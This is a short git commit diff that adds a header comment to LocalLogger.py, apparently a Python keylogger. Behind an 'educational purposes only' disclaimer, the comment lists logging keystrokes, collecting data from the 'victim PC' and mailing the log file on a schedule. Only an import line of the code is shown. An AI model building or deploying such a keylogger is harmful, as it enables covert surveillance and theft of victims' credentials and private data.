00c5d3026416fec246607bf94d003541ddc07f40
Abhishek Iyengar <22311804+tinshade@users.noreply.github.com>
2019-03-23 16:33:37 +0530

    Update LocalLogger.py

--- LocalLogger.py
+++ LocalLogger.py
@@ -1,3 +1,17 @@
+'''
+Made by: Abhishek Iyengar
+DISCLAIMER : THIS IS STRICTLY FOR EDUCATIONAL PURPOSES ONLY.
+I DO NOT TAKE RESPONSIBILITY TO ANY OF YOUR ACTIONS.
+
+This is a simple keylogger I created using python. 
+#Funtionalities include:
+    1. Logging KeyStrokes on a machine.
+    2. Retrieving all the basic data from the victim PC.
+    3. Mail the log file at a scheduled time.
+
+****This was made with Python3.7.1****
+
+'''
 #Required for the logger to work.
 import pyHook, pythoncom, sys, logging , os , winsound , time
 
